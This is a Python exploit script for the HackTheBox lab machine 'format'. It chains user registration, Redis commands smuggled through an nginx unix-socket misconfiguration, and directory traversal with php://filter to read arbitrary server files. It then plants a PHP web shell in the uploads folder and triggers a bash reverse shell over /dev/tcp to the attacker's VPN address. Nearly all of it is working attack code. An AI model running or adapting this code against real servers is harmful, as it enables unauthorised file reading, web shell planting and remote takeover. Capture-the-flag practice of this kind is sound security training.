#!/usr/bin/env python3

"""
Author: poorduck
Date: 2023-05-14
Description: Directory Traversal and nginx misconfiguration to RCE exploit for HackTheBox machine "format"

Usage: python script.py [FILEPATH]
                        - Where FILEPATH is a absolute path of a file from root dir

Directory Traversal Example: python script.py '/etc/passwd'
RCE Example (Default LPORT 4141): python script.py

Pre-requirements:
    - Subdomain must be added in the "/etc/hosts" file i.e "10.10.11.213 app.microblog.htb"
    - HackTheBox VPN is connected on "tun0" interface
"""

import requests
import string
import random
import sys
import re
import warnings
import base64
import os
import urllib.parse
import http.client
import netifaces as ni

warnings.filterwarnings("ignore", category=DeprecationWarning) 

session = requests.session()
# session.proxies = {"http": "http://127.0.0.1:8080"}
rhost = "http://app.microblog.htb"
rhost_ip = "http://10.10.11.213"
rnd_word = ''.join(random.choices(string.ascii_lowercase, k=10))

# Get HackTheBox vpn ip from tun0 interface
try:
    htb_vpn_inf = 'tun0'
    lhost = ni.ifaddresses(htb_vpn_inf)[ni.AF_INET][0]['addr']
except ValueError as e:
    print("[!] tun0 not found!")
    exit(e)

def redis_over_http(host, method, sock_path, redis_cmd):

    conn = http.client.HTTPConnection(host)

    path = f"/static/unix:{urllib.parse.quote(sock_path)}:{urllib.parse.quote(redis_cmd)}/_"

    conn.request(method, path)
    response = conn.getresponse()
    conn.close()

    if response.status == 502:
        return True
    else:
        return False


def register_user(url, random_word):
    data = {"first-name": random_word, "last-name": random_word, "username": random_word, "password": random_word}
    resp = session.post(f"{url}/register/index.php", data=data, allow_redirects=False)

    if resp.status_code == 302:

        if "success" in resp.headers["Location"]:

            print("[+] Username&Password =", random_word)

            # Enable pro
            method = "HSET"
            path = "/var/run/redis/redis.sock"
            username = random_word
            key = "pro"
            value = "true"

            redis_over_http(host='microblog.htb', method=method, sock_path=path, redis_cmd=f"{username} {key} {value} ")

            return True
        else:
            return False
    else:
        return False


def create_blog(url, random_word, remote_ip):

    data = {"new-blog-name": random_word}
    resp = session.post(f"{url}/dashboard/index.php", data=data, allow_redirects=False)

    if resp.status_code == 302:

        if "success" in resp.headers["Location"]:

            blog_host = random_word + ".microblog.htb"
            print("[+] New Blog =", blog_host)
            headers = {"Host": blog_host}
            resp = session.get(f"{remote_ip}/edit/index.php", headers=headers, allow_redirects=False, timeout=10)

            pro = re.findall(r"const pro = (.*?);", resp.text)[0]

            if pro == 'true':
                return blog_host, True
            else:
                return blog_host, False
        else:
            return False, False
    else:
        return False, False


def edit_blog(url, remote_ip, filename, content):
    data = {"id": filename, "txt": content}
    headers = {"Host": url}
    resp = session.post(f"{remote_ip}/edit/index.php", data=data, headers=headers, allow_redirects=False, timeout=10)

    if resp.status_code == 302:

        if "success" in resp.headers["Location"]:

            print("[+] Edit successfully!")

            resp = session.get(remote_ip, headers=headers)

            regex1 = r'const html = "<div class = \\".*\\">(.*?)<\\/div>"'
            regex2 = r'<div class = \\"blog-text\\">(.*?)<\\/div>'

            file_data = re.findall(regex1 + '|' + regex2, resp.text)

            if file_data[0]:

                print("[+] File content -\n")

                for data in file_data[0]:
                    if data:
                        decoded_data = data
                        while True:
                            try:
                                decoded_data = base64.b64decode(decoded_data).decode()
                            except:
                                break
                        return decoded_data.replace('\/', '/').encode('utf-8').decode('unicode_escape')

    exit("[-] Something went wrong while editing!")


if __name__ == "__main__":
    fn = ''
    try:
        fn += sys.argv[1]

        _, ext = os.path.splitext(fn)
        if ext.lower() == '.php':
            fn = "php://filter/convert.base64-encode/resource="+fn

    except IndexError as e:
        print(f"[+] No file to read, Running reverse shell on {lhost} on port 4141.")
        pass

    try:
        is_registered = register_user(url=rhost, random_word=rnd_word)
        if is_registered:
            blog_host, is_pro = create_blog(url=rhost, random_word=rnd_word, remote_ip=rhost_ip)
            if blog_host:
                if fn:
                    resp = edit_blog(url=blog_host, remote_ip=rhost_ip, filename=fn, content="File write successfully!!!")
                    print(resp)
                elif is_pro:
                    edit_blog(url=blog_host, remote_ip=rhost_ip, filename="../uploads/shell.php", content="<?php system($_GET['cmd']); ?>")

                    shell = f"/bin/bash -c 'bash -i >%26 /dev/tcp/{lhost}/4141 0>%261'"
                    session.get(f"{rhost}/uploads/shell.php?cmd={shell}", timeout=10, headers={"Host": blog_host})
                else:
                    print("[-] RCE failed!")
                    print("Usage: script.py [FILEPATH]")
            else:
                print("[-] Error while creating blog site!")
        else:
            print("[-] Error while registering new user!")

    except KeyboardInterrupt as e:
        print(e)
    except Exception as e:
        print(e)
